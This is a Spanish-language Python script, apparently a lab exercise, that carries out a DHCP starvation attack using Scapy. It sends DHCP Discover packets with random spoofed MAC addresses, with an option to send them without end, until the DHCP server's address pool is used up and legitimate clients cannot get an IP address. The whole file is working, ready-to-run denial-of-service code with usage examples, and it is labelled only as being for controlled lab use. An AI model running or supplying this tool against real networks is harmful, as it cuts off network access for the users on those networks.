#!/usr/bin/env python3
"""
=============================================================
  DHCP Starvation Attack Script
  Protocolo: DHCP - Layer 2/3
  Herramienta: Scapy
  Autor: Rey Marte - 2025-0684
  Uso educativo / laboratorio controlado
=============================================================

DESCRIPCIÓN:
  Agota el pool de IPs del servidor DHCP enviando múltiples
  DHCP Discover con MACs de origen aleatorias. Cuando el pool
  se agota, ningún cliente legítimo puede obtener una IP.

  Flujo del ataque:
  - Genera MACs aleatorias como identidad de cliente
  - Envía DHCP Discover por cada MAC
  - El servidor asigna una IP por cada solicitud
  - El pool se agota → clientes legítimos quedan sin IP

REQUISITOS:
  - Python 3.x
  - Scapy: pip install scapy
  - Ejecutar como root

USO:
  sudo python3 dhcp_starvation.py -i <interfaz> [-c <cantidad>] [-d <delay>]

EJEMPLOS:
  sudo python3 dhcp_starvation.py -i ens3
  sudo python3 dhcp_starvation.py -i ens3 -c 200 -d 0.1
  sudo python3 dhcp_starvation.py -i ens3 -c 0        # infinito

PARÁMETROS:
  -i  Interfaz de red (ej: ens3)
  -c  Cantidad de paquetes (0 = infinito, default: 100)
  -d  Delay entre paquetes en segundos (default: 0.05)
  -v  Modo verbose (muestra cada paquete enviado)
"""

import argparse
import sys
import time
import random
import signal
import struct
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    sendp, conf, RandMAC
)


# ──────────────────────────────────────────────
#  Variables globales
# ──────────────────────────────────────────────
sent_count = 0
start_time = None


# ──────────────────────────────────────────────
#  Utilidades
# ──────────────────────────────────────────────
def random_mac():
    """Genera una MAC aleatoria unicast."""
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5)
    )


def mac_to_bytes(mac):
    """Convierte MAC string a bytes para BOOTP chaddr."""
    return bytes(int(x, 16) for x in mac.split(':'))


# ──────────────────────────────────────────────
#  Manejo de interrupción Ctrl+C
# ──────────────────────────────────────────────
def signal_handler(sig, frame):
    elapsed = time.time() - start_time
    print(f"\n\n[!] Ataque interrumpido por el usuario.")
    print(f"[*] Paquetes enviados    : {sent_count}")
    print(f"[*] Tiempo transcurrido  : {elapsed:.2f}s")
    print(f"[*] Tasa promedio        : {sent_count/elapsed:.1f} pkt/s")
    sys.exit(0)


# ──────────────────────────────────────────────
#  Construcción del DHCP Discover
# ──────────────────────────────────────────────
def build_discover(mac):
    """
    Construye un DHCP Discover con la MAC indicada.
    El chaddr (client hardware address) identifica al cliente.
    """
    mac_bytes = mac_to_bytes(mac)
    # Padding chaddr a 16 bytes (requerido por BOOTP)
    chaddr = mac_bytes + b'\x00' * 10

    pkt = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(
            op=1,           # Request
            htype=1,        # Ethernet
            hlen=6,
            xid=random.randint(0, 0xFFFFFFFF),
            chaddr=chaddr
        ) /
        DHCP(options=[
            ("message-type", "discover"),
            ("hostname", f"host-{random.randint(1000,9999)}"),
            ("param_req_list", [1, 3, 6, 15]),
            "end"
        ])
    )
    return pkt


# ──────────────────────────────────────────────
#  Ataque principal
# ──────────────────────────────────────────────
def dhcp_starvation(iface, count, delay, verbose):
    global sent_count, start_time

    print("=" * 60)
    print("  DHCP Starvation Attack - Herramienta de Laboratorio")
    print("=" * 60)
    print(f"  Interfaz : {iface}")
    print(f"  Paquetes : {count if count > 0 else 'infinito'}")
    print(f"  Delay    : {delay}s")
    print(f"  Verbose  : {'Sí' if verbose else 'No'}")
    print("=" * 60)
    print("[*] Iniciando ataque... Ctrl+C para detener.")
    print("[!] OBJETIVO: Agotar el pool DHCP con MACs falsas\n")

    conf.verb = 0
    start_time = time.time()
    signal.signal(signal.SIGINT, signal_handler)

    i = 0
    while count == 0 or i < count:
        mac = random_mac()
        pkt = build_discover(mac)

        try:
            sendp(pkt, iface=iface, verbose=False)
            sent_count += 1
            i += 1
        except Exception as e:
            print(f"[!] Error al enviar paquete: {e}")
            break

        if verbose:
            print(f"[+] Discover #{sent_count:05d} | MAC: {mac}")
        elif sent_count % 50 == 0:
            elapsed = time.time() - start_time
            rate = sent_count / elapsed if elapsed > 0 else 0
            print(f"\r[*] Enviados: {sent_count} Discovers | {rate:.1f} pkt/s", end="", flush=True)

        if delay > 0:
            time.sleep(delay)

    elapsed = time.time() - start_time
    print(f"\n\n[✓] Ataque completado.")
    print(f"[*] Total enviados   : {sent_count}")
    print(f"[*] Tiempo total     : {elapsed:.2f}s")
    print(f"[*] Tasa promedio    : {sent_count/elapsed:.1f} pkt/s")
    print(f"\n[!] Verifica en el router: show ip dhcp pool")
    print(f"[!] Un cliente legítimo debería fallar al obtener IP.")


# ──────────────────────────────────────────────
#  Punto de entrada
# ──────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="DHCP Starvation Attack Script - Uso en laboratorio controlado",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  sudo python3 dhcp_starvation.py -i ens3
  sudo python3 dhcp_starvation.py -i ens3 -c 200 -d 0.1
  sudo python3 dhcp_starvation.py -i ens3 -c 0           # infinito
        """
    )
    parser.add_argument("-i", "--iface",   required=True, help="Interfaz de red (ej: ens3)")
    parser.add_argument("-c", "--count",   type=int, default=100, help="Paquetes a enviar (0 = infinito, default: 100)")
    parser.add_argument("-d", "--delay",   type=float, default=0.05, help="Delay entre paquetes en segundos (default: 0.05)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Mostrar detalle de cada paquete")

    args = parser.parse_args()

    import os
    if os.geteuid() != 0:
        print("[!] Este script requiere privilegios de root.")
        print("    Ejecuta: sudo python3 dhcp_starvation.py ...")
        sys.exit(1)

    dhcp_starvation(args.iface, args.count, args.delay, args.verbose)


if __name__ == "__main__":
    main()
